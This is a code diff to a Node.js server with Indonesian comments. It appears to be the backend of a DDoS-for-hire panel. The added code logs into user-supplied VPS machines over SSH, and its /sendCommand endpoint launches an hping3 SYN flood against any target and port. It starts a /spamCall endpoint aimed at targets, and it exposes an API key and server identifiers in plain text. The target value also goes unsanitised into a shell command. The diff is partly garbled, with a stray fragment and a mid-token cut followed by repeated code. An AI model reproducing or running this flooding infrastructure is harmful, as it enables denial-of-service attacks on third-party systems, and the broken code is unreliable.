@@ -218,7 +218,7 @@ async function sendStartupMessages() {
 setTimeout(sendStartupMessages, 2000);
 
 const GROUP_ID = -1004450641303; // ganti dengan ID grup kamu
-const PANEL_URL = "https://tama-yoshimitsu.jerzzoffc.my.id"; // TANPA slash /
+const PANEL_URL = "https://baserio-production.up.railway.app"; // TANPA slash /
 const PTLC_KEY = "ptlc_w73RWNDzgSdrmtIugDzAE3uPXmceUMaZsliUk6nOpg3";
 const SERVER_UUID = "f93782eb-328b-44e9-9b94-fcea86198cdb";
 
@@ -324,6 +324,361 @@ wss.on('connection', function (ws, req) {
             const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
         const validKey = session.find(e => e.sessionKey === data.key)
         const validId = session.find(e => e.androidId === data.androidId)
+          
+        if (!validKey) {
+          ws.send(JSON.stringify({
+            type: "myInfo",
+            valid: false,
+            reason: "keyInvalid"
+          }));
+          return ws.close();
+        }
+
+        if (!validId) {
+          ws.send(JSON.stringify({
+            type: "myInfo",
+            valid: false,
+            reason: "androidIdMismatch"
+          }));
+          return ws.close();
+        }
+
+            }, 10000);
+      }
+      if (data.type === 'auth') {
+        username = getUserByKey(data.key);
+         console.log(username)
+        if (!username) return ws.close();
+        wsClients[username] = ws;
+
+        // Kirim chatList awal
+const list = chatList
+  .filter(m => m.from === username || m.to === username)
+  .map(m => (m.from === username ? m.to : m.from));
+
+  ws.send(JSON.stringify({
+    type: "chatList",
+    users: [...new Set(list)],
+  }));
+      }
+
+      if (data.type === 'chat') {
+        const to = data.to;
+        const message = sanitize(data.message);
+if (!username || !to || !message || message.length > 250) return;
+
+        const chat = {
+          from: username,
+          to,
+          message,
+          time: new Date().toISOString()
+        };
+        chatList.push(chat);
+        saveChat();
+
+        // Kirim ke pengirim
+        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));
+
+        // Kirim ke penerima jika online
+        if (wsClients[to]) {
+          wsClients[to].send(JSON.stringify({
+            type: 'chat',
+            message: { ...chat, fromMe: false }
+          }));
+        }
+      }
+
+      if (data.type === 'getMessages') {
+        const withUser = data.with;
+        const messages = chatList
+          .filter(m =>
+            (m.from === username && m.to === withUser) ||
+            (m.from === withUser && m.to === username)
+          )
+          .map(m => ({
+            ...m,
+            fromMe: m.from === username
+          }));
+
+        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
+      }
+    } catch (e) {
+      console.error("WS error:", e.message);
+    }
+  });
+
+  ws.on('close', () => {
+    if (username && wsClients[username]) {
+      delete wsClients[username];
+    }
+  });
+});
+
+// Ganti listen jadi ini:
+const wsPort = 10829;
+server.listen(wsPort, () => {
+  console.log(`🟣 Server running on https://baserio-production.up.railway.app${wsPort}`);
+});
+
+const PORT = 10829;
+
+
+
+
+app.use(express.urlencoded({ extended: false }));
+app.use(express.json());
+// ===== Rate Limit Middleware (20 req/detik per token) =====
+const rateLimitMap = {};
+function rateLimiter(req, res, next) {
+  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
+  if (!key) return next();
+
+  const now = Date.now();
+  if (!rateLimitMap[key]) rateLimitMap[key] = [];
+
+  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
+  rateLimitMap[key].push(now);
+
+  if (rateLimitMap[key].length > 2) {
+    const db = loadDatabase();
+    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
+    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);
+
+    return res.status(429).json({
+      valid: false,
+      rateLimit: true,
+      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
+    });
+  }
+
+  next();
+}
+
+app.use(rateLimiter);
+
+
+app.use((req, res, next) => {
+  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
+  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.header("Access-Control-Allow-Headers", "Content-Type");
+  next();
+});
+
+
+if (fs.existsSync(KEY_FILE)) {
+  try {
+    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
+    const parsed = JSON.parse(rawData); // ini array
+
+    for (const user of parsed) {
+      if (user.sessionKey && user.username && user.lastLogin) {
+        const created = new Date(user.lastLogin).getTime();
+        const expires = created + 10 * 60 * 1000; // +10 menit
+
+        activeKeys[user.sessionKey] = {
+          username: user.username,
+          created,
+          expires,
+        };
+      }
+    }
+
+    console.log("✅ activeKeys loaded from keyList.json.");
+  } catch (err) {
+    console.error("❌ Failed to load keyList.json:", err.message);
+  }
+}
+
+
+function connectToAllVPS() {
+  if (!cncActive) return;
+
+  console.log("🔄 Connecting to all VPS servers...");
+
+  for (const vps of vpsList) {
+    if (vpsConnections[vps.host]) {
+      console.log(`✅ Already connected to ${vps.host}`);
+      continue;
+    }
+
+    const conn = new Client();
+
+    conn.on('ready', () => {
+      if (!cncActive) {
+        conn.end(); // Langsung tutup kalau CNC tidak aktif
+        return;
+      }
+
+      console.log(`✅ Connected to VPS: ${vps.host}`);
+      vpsConnections[vps.host] = conn;
+
+      // Jika koneksi putus, reconnect otomatis
+      conn.on('close', () => {
+        console.log(`🔌 Disconnected: ${vps.host}`);
+        delete vpsConnections[vps.host];
+
+        if (cncActive) {
+          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
+          setTimeout(connectToAllVPS, 5000);
+        }
+      });
+    });
+
+    conn.on('error', (err) => {
+      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
+    });
+
+    conn.connect({
+      host: vps.host,
+      username: vps.username,
+      password: vps.password,
+      readyTimeout: 5000
+    });
+  }
+}
+
+// 🚫 Disconnect semua koneksi (misal saat restart)
+function disconnectAllVPS() {
+  console.log("🛑 Disconnecting all VPS connections...");
+  cncActive = false;
+
+  for (const host in vpsConnections) {
+    vpsConnections[host].end();
+    delete vpsConnections[host];
+  }
+}
+
+// Load VPS list saat server pertama kali jalan
+if (fs.existsSync(VPS_FILE)) {
+  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
+  console.log("📥 VPS list loaded.");
+    connectToAllVPS(); // Connect ke semua VPS saat server jalan
+}
+
+// Pantau perubahan file VPS
+fs.watch(VPS_FILE, () => {
+  try {
+    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
+    console.log("🔄 VPS list updated.");
+      connectToAllVPS(); // Connect ke semua VPS saat server jalan
+  } catch (e) {
+    console.error("❌ Failed to update VPS list:", e.message);
+  }
+});
+
+// Middleware: Cek sessionKey dan ambil username
+function getUserByKey(key) {
+  const keyInfo = activeKeys[key];
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  return user ? keyInfo.username : null;
+}
+
+// GET /myServer
+app.get("/myServer", (req, res) => {
+  const key = req.query.key;
+  const username = getUserByKey(key);
+  if (!username) return res.status(401).json({ error: "Invalid session key" });
+
+  const userVPS = vpsList.filter(vps => vps.owner === username);
+  res.json(userVPS);
+});
+
+// POST /addServer
+app.post("/addServer", (req, res) => {
+  const { key, host, username: sshUser, password } = req.body;
+  const owner = getUserByKey(key);
+  if (!owner) return res.status(401).json({ error: "Invalid session key" });
+
+  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });
+
+  const newVPS = { host, username: sshUser, password, owner };
+  vpsList.push(newVPS);
+  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
+  res.json({ success: true, message: "VPS added" });
+});
+
+// POST /delServer
+app.post("/delServer", (req, res) => {
+  const { key, host } = req.body;
+  const owner = getUserByKey(key);
+  if (!owner) return res.status(401).json({ error: "Invalid session key" });
+
+  const before = vpsList.length;
+  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
+  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
+
+  const deleted = before !== vpsList.length;
+  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
+});
+
+// POST /sendCommand
+app.post("/sendCommand", (req, res) => {
+  const { key, target, port, duration } = req.body;
+  const owner = getUserByKey(key);
+  if (!owner) return res.status(401).json({ error: "Invalid session key" });
+
+  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });
+
+  const userVPS = vpsList.filter(vps => vps.owner === owner);
+  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });
+
+  for (const vps of userVPS) {
+    const conn = vpsConnections[vps.host];
+    if (!conn) {
+      console.log(`❌ Not connected to ${vps.host}`);
+      continue;
+    }
+
+    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
+    const killCmd = `sleep ${duration}; pkill screen`;
+
+    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
+      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
+      stream.on('close', (code, signal) => {
+        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
+      });
+    });
+  }
+
+  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
+});
+
+
+function loadDatabase() {
+  if (!fs.existsSync(DB_PATH)) {
+    fs.writeFileSync(DB_PATH, JSON.stringify([]));
+    console.log("[🗃️ DB] Database baru dibuat.");
+  }
+  const data = JSON.parse(fs.readFileSync(DB_PATH));
+  return data;
+}
+
+function saveDatabase(data) {
+  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
+}
+
+function generateKey() {
+  const key = crypto.randomBytes(8).toString("hex");
+  console.log("[🔑 GEN] Key baru dibuat:", key);
+  return key;
+}
+
+function isExpired(user) {
+  const expired = new Date(user.expiredDate) < new Date();
+  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
+  return expired;
+}
+const spamCooldown = {}; // { username: { count, lastReset } }
+const cooldowns = {}; // { username: lastRaidTime }
+
+app.get("/spamCall", async (req, res) => {
+  const { key, target, qty } = req.query;
+
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false });
+
+  const db = loId === data.androidId)
           
         if (!validKey) {
           ws.send(JSON.stringify({
